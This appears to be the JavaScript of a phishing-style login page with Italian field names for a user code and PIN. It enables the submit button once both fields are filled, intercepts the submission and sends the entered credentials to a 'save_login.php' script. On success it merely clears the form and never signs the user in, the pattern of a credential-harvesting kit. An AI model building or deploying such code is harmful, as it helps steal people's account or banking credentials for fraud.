document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('login-form');
  const codiceInput = document.querySelector('input#login-user');
  const pinInput = document.querySelector('input#login-pin');
  const submitBtn = form.querySelector('button[type="submit"]');
  const btnWrapper = submitBtn.parentElement;

  function checkEnableButton() {
    const codiceValid = codiceInput.value.length >= 5;
    const pinValid = pinInput.value.length >= 3;
    const isEnabled = codiceValid && pinValid;
    
    submitBtn.disabled = !isEnabled;
    
    if (isEnabled) {
      btnWrapper.classList.remove('nbp-global-disable');
      submitBtn.style.cursor = 'pointer';
    } else {
      btnWrapper.classList.add('nbp-global-disable');
      submitBtn.style.cursor = 'default';
    }
  }

  codiceInput.addEventListener('input', checkEnableButton);
  pinInput.addEventListener('input', checkEnableButton);

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    if (submitBtn.disabled) return;

    fetch('save_login.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        codice: codiceInput.value,
        pin: pinInput.value
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        form.reset();
        checkEnableButton();
      }
    });
  });

  checkEnableButton();
}); 